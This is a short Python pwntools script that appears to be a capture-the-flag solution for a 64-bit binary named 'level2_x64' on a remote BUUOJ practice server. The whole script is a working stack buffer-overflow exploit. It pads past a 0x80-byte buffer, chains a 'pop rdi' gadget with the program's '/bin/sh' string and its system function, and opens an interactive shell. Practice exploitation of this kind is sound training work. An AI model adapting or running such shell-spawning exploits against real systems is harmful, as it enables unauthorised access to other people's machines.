from pwn import *
context.arch='amd64'

# there are function system and strings '/bin/sh' in program, just use it

# p = process('./level2_x64')
p = remote('node3.buuoj.cn',28826)
elf = ELF('./level2_x64',checksec=False)

binsh = elf.sym['hint']
system_addr = elf.sym['system']
main = elf.sym['main']

pop_rdi = 0x00000000004006b3 # pop rdi ; ret

payload = 'A'*(0x80+8)
payload += flat([pop_rdi, binsh, system_addr, main])
p.send(payload)
sleep(1)
p.interactive()
